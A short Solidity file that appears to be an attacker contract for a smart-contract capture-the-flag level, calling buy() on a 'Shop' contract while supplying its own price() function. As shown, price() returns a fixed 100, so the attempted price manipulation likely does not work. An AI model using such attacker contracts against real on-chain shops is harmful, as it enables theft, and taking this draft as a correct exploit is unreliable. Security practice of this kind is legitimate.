pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
}

contract AttackerContract2 {
    uint256 private attackPrice = 100; // Initial Shop price

    function deployAndBuyAgain(address shopAddress) public {
        Shop(shopAddress).buy();
    }

    function price() external view returns (uint256) {
        return attackPrice;
    }
}